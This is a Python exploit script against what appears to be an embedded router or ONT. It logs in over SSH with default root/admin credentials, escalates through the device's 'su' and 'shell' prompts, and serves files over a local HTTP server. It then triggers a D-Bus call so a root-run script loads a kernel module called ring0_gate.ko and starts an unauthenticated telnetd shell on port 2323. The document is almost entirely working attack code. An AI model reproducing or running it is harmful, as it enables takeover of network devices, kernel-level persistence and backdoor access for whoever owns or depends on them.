import http.server, socketserver, threading, time, os, sys, paramiko, json

scratch_dir = r'xxx'

# 1. Script executed by appmgr (Root UID 0 inside container)
# Output written to /ipks/root_result.txt which maps to /mnt/jffs2/plug/apps/apps/ipks/root_result.txt on host!
run_root_content = """#!/bin/sh
echo "=== ROOT SCRIPT STARTED at $(date) ===" > /ipks/root_result.txt
echo "ID: $(id)" >> /ipks/root_result.txt
echo "PWD: $(pwd)" >> /ipks/root_result.txt

# Try all possible insmod paths with /ipks/ring0_gate.ko
echo "=== TRYING INSMOD ===" >> /ipks/root_result.txt
insmod /ipks/ring0_gate.ko >> /ipks/root_result.txt 2>&1
/sbin/insmod /ipks/ring0_gate.ko >> /ipks/root_result.txt 2>&1
/bin/insmod /ipks/ring0_gate.ko >> /ipks/root_result.txt 2>&1

echo "=== CHECKING /proc/modules ===" >> /ipks/root_result.txt
grep ring0 /proc/modules >> /ipks/root_result.txt 2>&1

echo "=== CHECKING TELNETD ===" >> /ipks/root_result.txt
/usr/sbin/telnetd -p 2323 -l /bin/sh &
sleep 1
netstat -tulpn | grep 2323 >> /ipks/root_result.txt 2>&1

echo "=== SCRIPT FINISHED ===" >> /ipks/root_result.txt
"""
with open(os.path.join(scratch_dir, 'run_root.sh'), 'w', encoding='utf-8', newline='\n') as f:
    f.write(run_root_content)

# 2. HTTP Server
class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=scratch_dir, **kwargs)
    def log_message(self, format, *args):
        print(f"[HTTP {time.strftime('%H:%M:%S')}] {args[0]}")

socketserver.TCPServer.allow_reuse_address = True
httpd = socketserver.TCPServer(('192.168.100.2', 8888), CustomHandler)
server_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
server_thread.start()
print("[*] HTTP Server running on 192.168.100.2:8888")

try:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect('192.168.100.1', port=22, username='root', password='admin', timeout=8, look_for_keys=False, allow_agent=False)
    chan = ssh.invoke_shell()
    time.sleep(1)

    def send_and_wait(cmd, expected="#", timeout=4):
        chan.send(cmd + "\n")
        t0 = time.time()
        buf = ""
        while time.time() - t0 < timeout:
            if chan.recv_ready():
                buf += chan.recv(4096).decode('utf-8', 'ignore')
                if expected in buf:
                    break
            time.sleep(0.1)
        return buf

    init_out = chan.recv(4096).decode('utf-8', 'ignore')
    if "Remove one session" in init_out or "Enter the ID" in init_out:
        send_and_wait("1", "WAP>")

    send_and_wait("su", "SU_WAP>")
    send_and_wait("shell", "#")

    # Clean old result
    send_and_wait("rm -f /mnt/jffs2/plug/apps/apps/ipks/root_result.txt", "#")

    # Trigger D-Bus
    print("[*] Triggering D-Bus call via sh /tmp/trigger_dbus.sh...")
    out_exec = send_and_wait("sh /tmp/trigger_dbus.sh", "#", timeout=5)
    print(out_exec.strip())

    # Wait for execution
    print("[*] Waiting 4 seconds for execution...")
    time.sleep(4)

    # Read result from shared directory
    print("[*] Reading result from /mnt/jffs2/plug/apps/apps/ipks/root_result.txt:")
    out_res = send_and_wait("cat /mnt/jffs2/plug/apps/apps/ipks/root_result.txt", "#")
    print("\n" + "="*50)
    print(out_res.strip())
    print("="*50)

    # Check lsmod in host
    print("\n[*] Host lsmod grep ring0:")
    out_lsmod = send_and_wait("lsmod", "#")
    for l in out_lsmod.splitlines():
        if "ring0" in l:
            print("  FOUND:", l)

    ssh.close()
finally:
    httpd.shutdown()
    httpd.server_close()
